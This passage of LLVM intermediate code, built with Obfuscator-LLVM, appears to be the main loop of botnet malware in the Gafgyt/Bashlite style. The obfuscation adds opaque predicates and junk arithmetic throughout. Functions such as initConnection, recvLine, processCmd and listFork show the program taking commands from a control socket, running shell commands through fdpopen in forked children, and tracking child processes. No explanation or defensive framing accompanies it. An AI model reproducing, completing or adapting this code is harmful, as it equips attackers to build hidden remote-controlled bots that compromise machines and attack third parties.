  %577 = zext i8 %576 to i32
  %578 = icmp ne i32 %577, 32
  br i1 %578, label %579, label %584

; <label>:579:                                    ; preds = %574
  %580 = load i8*, i8** %23, align 8
  %581 = load i8, i8* %580, align 1
  %582 = zext i8 %581 to i32
  %583 = icmp ne i32 %582, 0
  br label %584

; <label>:584:                                    ; preds = %579, %574
  %585 = phi i1 [ false, %574 ], [ %583, %579 ]
  br i1 %585, label %586, label %589

; <label>:586:                                    ; preds = %584
  %587 = load i8*, i8** %23, align 8
  %588 = getelementptr inbounds i8, i8* %587, i32 1
  store i8* %588, i8** %23, align 8
  br label %574

; <label>:589:                                    ; preds = %584
  %590 = load i8*, i8** %23, align 8
  store i8 0, i8* %590, align 1
  %591 = load i8*, i8** %23, align 8
  %592 = getelementptr inbounds i8, i8* %591, i32 1
  store i8* %592, i8** %23, align 8
  %593 = load i8*, i8** %25, align 8
  store i8* %593, i8** %26, align 8
  br label %594

; <label>:594:                                    ; preds = %598, %589
  %595 = load i8*, i8** %26, align 8
  %596 = load i8, i8* %595, align 1
  %597 = icmp ne i8 %596, 0
  br i1 %597, label %598, label %607

; <label>:598:                                    ; preds = %594
  %599 = load i8*, i8** %26, align 8
  %600 = load i8, i8* %599, align 1
  %601 = zext i8 %600 to i32
  %602 = call i32 @toupper(i32 %601) #10
  %603 = trunc i32 %602 to i8
  %604 = load i8*, i8** %26, align 8
  store i8 %603, i8* %604, align 1
  %605 = load i8*, i8** %26, align 8
  %606 = getelementptr inbounds i8, i8* %605, i32 1
  store i8* %606, i8** %26, align 8
  br label %594

; <label>:607:                                    ; preds = %594
  %608 = load i8*, i8** %25, align 8
  %609 = call i32 @strcmp(i8* %608, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i32 0, i32 0)) #10
  %610 = icmp eq i32 %609, 0
  br i1 %610, label %611, label %650

; <label>:611:                                    ; preds = %607
  %612 = call i32 @listFork()
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %615

; <label>:614:                                    ; preds = %611
  br label %169

; <label>:615:                                    ; preds = %611
  %616 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %616, i8 0, i64 1024, i32 16, i1 false)
  %617 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %618 = load i8*, i8** %23, align 8
  %619 = call i32 (i8*, i8*, ...) @szprintf(i8* %617, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* %618)
  %620 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %621 = call i32 @fdpopen(i8* %620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0))
  store i32 %621, i32* %28, align 4
  br label %622

; <label>:622:                                    ; preds = %627, %615
  %623 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %624 = load i32, i32* %28, align 4
  %625 = call i8* @fdgets(i8* %623, i32 1024, i32 %624)
  %626 = icmp ne i8* %625, null
  br i1 %626, label %627, label %631

; <label>:627:                                    ; preds = %622
  %628 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @trim(i8* %628)
  %629 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %629, i8 0, i64 1024, i32 16, i1 false)
  %630 = call i32 @sleep(i32 1)
  br label %622

; <label>:631:                                    ; preds = %622
  %632 = load i32, i32* @x.87
  %633 = load i32, i32* @y.88
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %631
  %640 = load i32, i32* %28, align 4
  %641 = call i32 @fdpclose(i32 %640)
  call void @exit(i32 0) #14
  %642 = load i32, i32* @x.87
  %643 = load i32, i32* @y.88
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  unreachable

; <label>:650:                                    ; preds = %607
  %651 = load i32, i32* @x.87
  %652 = load i32, i32* @y.88
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %650
  store i32 1, i32* %30, align 4
  %659 = load i8*, i8** %23, align 8
  %660 = call i8* @strtok(i8* %659, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %660, i8** %31, align 8
  %661 = load i8*, i8** %25, align 8
  %662 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %661, i8** %662, align 16
  %663 = load i32, i32* @x.87
  %664 = load i32, i32* @y.88
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %671

; <label>:671:                                    ; preds = %718, %originalBBpart2119
  %672 = load i8*, i8** %31, align 8
  %673 = icmp ne i8* %672, null
  br i1 %673, label %674, label %720

; <label>:674:                                    ; preds = %671
  %675 = load i32, i32* @x.87
  %676 = load i32, i32* @y.88
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %674
  %683 = load i8*, i8** %31, align 8
  %684 = load i8, i8* %683, align 1
  %685 = zext i8 %684 to i32
  %686 = icmp ne i32 %685, 10
  %687 = load i32, i32* @x.87
  %688 = load i32, i32* @y.88
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %686, label %695, label %718

; <label>:695:                                    ; preds = %originalBBpart2123
  %696 = load i8*, i8** %31, align 8
  %697 = call i64 @strlen(i8* %696) #10
  %698 = add i64 %697, 1
  %699 = call noalias i8* @malloc(i64 %698) #2
  %700 = load i32, i32* %30, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %701
  store i8* %699, i8** %702, align 8
  %703 = load i32, i32* %30, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %704
  %706 = load i8*, i8** %705, align 8
  %707 = load i8*, i8** %31, align 8
  %708 = call i64 @strlen(i8* %707) #10
  %709 = add i64 %708, 1
  call void @llvm.memset.p0i8.i64(i8* %706, i8 0, i64 %709, i32 1, i1 false)
  %710 = load i32, i32* %30, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = load i8*, i8** %31, align 8
  %715 = call i8* @strcpy(i8* %713, i8* %714) #2
  %716 = load i32, i32* %30, align 4
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %30, align 4
  br label %718

; <label>:718:                                    ; preds = %695, %originalBBpart2123
  %719 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %719, i8** %31, align 8
  br label %671

; <label>:720:                                    ; preds = %671
  %721 = load i32, i32* %30, align 4
  %722 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i32 0, i32 0
  call void @processCmd(i32 %721, i8** %722)
  %723 = load i32, i32* %30, align 4
  %724 = icmp sgt i32 %723, 1
  br i1 %724, label %725, label %755

; <label>:725:                                    ; preds = %720
  store i32 1, i32* %32, align 4
  store i32 1, i32* %32, align 4
  br label %726

; <label>:726:                                    ; preds = %originalBBpart2129, %725
  %727 = load i32, i32* %32, align 4
  %728 = load i32, i32* %30, align 4
  %729 = icmp slt i32 %727, %728
  br i1 %729, label %730, label %754

; <label>:730:                                    ; preds = %726
  %731 = load i32, i32* %32, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %732
  %734 = load i8*, i8** %733, align 8
  call void @free(i8* %734) #2
  br label %735

; <label>:735:                                    ; preds = %730
  %736 = load i32, i32* @x.87
  %737 = load i32, i32* @y.88
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %735
  %744 = load i32, i32* %32, align 4
  %745 = add nsw i32 %744, 1
  store i32 %745, i32* %32, align 4
  %746 = load i32, i32* @x.87
  %747 = load i32, i32* @y.88
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBBpart2129, label %originalBB125alteredBB

originalBBpart2129:                               ; preds = %originalBB125
  br label %726

; <label>:754:                                    ; preds = %726
  br label %755

; <label>:755:                                    ; preds = %754, %720
  %756 = load i32, i32* @x.87
  %757 = load i32, i32* @y.88
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %755
  %764 = load i32, i32* @x.87
  %765 = load i32, i32* @y.88
  %766 = sub i32 %764, 1
  %767 = mul i32 %764, %766
  %768 = urem i32 %767, 2
  %769 = icmp eq i32 %768, 0
  %770 = icmp slt i32 %765, 10
  %771 = or i1 %769, %770
  br i1 %771, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %772

; <label>:772:                                    ; preds = %originalBBpart2133, %originalBBpart280
  br label %169

; <label>:773:                                    ; preds = %originalBBpart220
  br label %144
                                                  ; No predecessors!
  %775 = load i32, i32* %11, align 4
  ret i32 %775

originalBBalteredBB:                              ; preds = %originalBB, %2
  %776 = alloca i32, align 4
  %777 = alloca i32, align 4
  %778 = alloca i8**, align 8
  %779 = alloca i8*, align 8
  %780 = alloca i32, align 4
  %781 = alloca i32, align 4
  %782 = alloca i32, align 4
  %783 = alloca [4096 x i8], align 16
  %784 = alloca i32, align 4
  %785 = alloca i32, align 4
  %786 = alloca i32*, align 8
  %787 = alloca i32, align 4
  %788 = alloca i8*, align 8
  %789 = alloca i8*, align 8
  %790 = alloca i8*, align 8
  %791 = alloca i8*, align 8
  %792 = alloca [1024 x i8], align 16
  %793 = alloca i32, align 4
  %794 = alloca [10 x i8*], align 16
  %795 = alloca i32, align 4
  %796 = alloca i8*, align 8
  %797 = alloca i32, align 4
  store i32 0, i32* %776, align 4
  store i32 %0, i32* %777, align 4
  store i8** %1, i8*** %778, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i8** %779, align 8
  %798 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i32 0, i32 0), i32 0) #2
  %799 = icmp ne i32 %798, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i32 0, i32 0), i8** %14, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  %800 = load i32, i32* %15, align 4
  %801 = call i32 @waitpid(i32 %800, i32* %17, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %122
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %144
  %802 = call i32 @initConnection()
  %803 = icmp ne i32 %802, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %169
  %804 = load i32, i32* @mainCommSock, align 4
  %805 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %806 = call i32 @recvLine(i32 %804, i8* %805, i32 4096)
  store i32 %806, i32* %19, align 4
  %807 = icmp ne i32 %806, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %190
  store i32 0, i32* %20, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %207
  %808 = load i32, i32* %20, align 4
  %809 = sext i32 %808 to i64
  %810 = load i64, i64* @numpids, align 8
  %811 = icmp ult i64 %809, %810
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %228
  %812 = load i32*, i32** @pids, align 8
  %813 = load i32, i32* %20, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds i32, i32* %812, i64 %814
  %816 = load i32, i32* %815, align 4
  %817 = call i32 @waitpid(i32 %816, i32* null, i32 1)
  %818 = icmp sgt i32 %817, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %255
  %819 = load i32, i32* %22, align 4
  %820 = zext i32 %819 to i64
  %821 = load i64, i64* @numpids, align 8
  %822 = icmp ult i64 %820, %821
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %290
  %823 = load i32*, i32** @pids, align 8
  %824 = load i32, i32* %22, align 4
  %_ = sub i32 %824, 1
  %gen = mul i32 %_, 1
  %_39 = shl i32 %824, 1
  %_40 = sub i32 0, %824
  %gen41 = add i32 %_40, 1
  %_42 = sub i32 0, %824
  %gen43 = add i32 %_42, 1
  %825 = sub i32 %824, 1
  %826 = zext i32 %825 to i64
  %827 = getelementptr inbounds i32, i32* %823, i64 %826
  store i32 0, i32* %827, align 4
  %828 = load i64, i64* @numpids, align 8
  %_44 = sub i64 0, %828
  %gen45 = add i64 %_44, -1
  %829 = add i64 %828, -1
  store i64 %829, i64* @numpids, align 8
  %830 = load i64, i64* @numpids, align 8
  %_46 = shl i64 %830, 1
  %_47 = shl i64 %830, 1
  %_48 = sub i64 %830, 1
  %gen49 = mul i64 %_48, 1
  %_50 = sub i64 %830, 1
  %gen51 = mul i64 %_50, 1
  %_52 = shl i64 %830, 1
  %831 = add i64 %830, 1
  %_53 = sub i64 %831, 4
  %gen54 = mul i64 %_53, 4
  %_55 = sub i64 %831, 4
  %gen56 = mul i64 %_55, 4
  %_57 = sub i64 %831, 4
  %gen58 = mul i64 %_57, 4
  %832 = mul i64 %831, 4
  %833 = call noalias i8* @malloc(i64 %832) #2
  %834 = bitcast i8* %833 to i32*
  store i32* %834, i32** %21, align 8
  store i32 0, i32* %22, align 4
  br label %originalBB38

originalBB62alteredBB:                            ; preds = %originalBB62, %334
  %835 = load i32, i32* %22, align 4
  %_63 = sub i32 %835, 1
  %gen64 = mul i32 %_63, 1
  %_65 = sub i32 %835, 1
  %gen66 = mul i32 %_65, 1
  %836 = add i32 %835, 1
  store i32 %836, i32* %22, align 4
  br label %originalBB62

originalBB70alteredBB:                            ; preds = %originalBB70, %361
  %837 = load i32, i32* %19, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 %838
  store i8 0, i8* %839, align 1
  %840 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %840)
  %841 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %842 = call i8* @strstr(i8* %841, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %843 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %844 = icmp eq i8* %842, %843
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %394
  call void @exit(i32 0) #14
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %411
  %845 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  store i8* %845, i8** %23, align 8
  %846 = load i8*, i8** %23, align 8
  %847 = load i8, i8* %846, align 1
  %848 = zext i8 %847 to i32
  %849 = icmp eq i32 %848, 33
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %436
  %850 = load i8*, i8** %24, align 8
  %851 = load i8, i8* %850, align 1
  %852 = zext i8 %851 to i32
  %853 = icmp ne i32 %852, 32
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %457
  %854 = load i8*, i8** %24, align 8
  %855 = load i8, i8* %854, align 1
  %856 = zext i8 %855 to i32
  %857 = icmp ne i32 %856, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %498
  %858 = load i8*, i8** %23, align 8
  %859 = load i8*, i8** %23, align 8
  %860 = call i64 @strlen(i8* %859) #10
  %_91 = sub i64 0, %860
  %gen92 = add i64 %_91, 1
  %_93 = sub i64 0, %860
  %gen94 = add i64 %_93, 1
  %861 = sub i64 %860, 1
  %862 = getelementptr inbounds i8, i8* %858, i64 %861
  %863 = load i8, i8* %862, align 1
  %864 = zext i8 %863 to i32
  %865 = icmp eq i32 %864, 10
  br label %originalBB90

originalBB98alteredBB:                            ; preds = %originalBB98, %523
  %866 = load i8*, i8** %23, align 8
  %867 = load i8*, i8** %23, align 8
  %868 = call i64 @strlen(i8* %867) #10
  %_99 = sub i64 0, %868
  %gen100 = add i64 %_99, 1
  %_101 = shl i64 %868, 1
  %_102 = sub i64 %868, 1
  %gen103 = mul i64 %_102, 1
  %_104 = sub i64 %868, 1
  %gen105 = mul i64 %_104, 1
  %869 = sub i64 %868, 1
  %870 = getelementptr inbounds i8, i8* %866, i64 %869
  %871 = load i8, i8* %870, align 1
  %872 = zext i8 %871 to i32
  %873 = icmp eq i32 %872, 13
  br label %originalBB98

originalBB109alteredBB:                           ; preds = %originalBB109, %556
  %874 = load i8*, i8** %23, align 8
  store i8* %874, i8** %25, align 8
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %631
  %875 = load i32, i32* %28, align 4
  %876 = call i32 @fdpclose(i32 %875)
  call void @exit(i32 0) #14
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %650
  store i32 1, i32* %30, align 4
  %877 = load i8*, i8** %23, align 8
  %878 = call i8* @strtok(i8* %877, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %878, i8** %31, align 8
  %879 = load i8*, i8** %25, align 8
  %880 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %879, i8** %880, align 16
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %674
  %881 = load i8*, i8** %31, align 8
  %882 = load i8, i8* %881, align 1
  %883 = zext i8 %882 to i32
  %884 = icmp ne i32 %883, 10
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %735
  %885 = load i32, i32* %32, align 4
  %_126 = sub i32 0, %885
  %gen127 = add i32 %_126, 1
  %886 = add nsw i32 %885, 1
  store i32 %886, i32* %32, align 4
  br label %originalBB125

originalBB131alteredBB:                           ; preds = %originalBB131, %755
  br label %originalBB131
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612306}
!2 = !{i32 -2146611615}
!3 = !{i32 -2146610866}
!4 = !{i32 -2146610043}
!5 = !{i32 -2146609223}
!6 = !{i32 -2146607762}
!7 = !{i32 -2146606900}
!8 = !{i32 -2146606179}
